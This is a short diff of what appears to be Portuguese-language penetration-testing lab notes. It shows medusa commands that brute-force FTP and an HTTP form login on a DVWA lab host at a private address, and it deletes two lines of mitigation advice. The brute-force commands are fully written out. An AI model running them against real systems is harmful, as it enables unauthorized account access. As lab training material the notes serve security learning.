@@ -55,7 +55,3 @@ medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp
 # Brute force HTTP (DVWA)
 medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http -m PAGE:'/dvwa/login.php' -m FORM:'username=^USER&password=^PASS&login=Login' -m FAIL:'Login failed'
 
-
-🔄 Atualizar serviços para versões sem vulnerabilidades
-
-🚫 Desativar serviços desnecessários
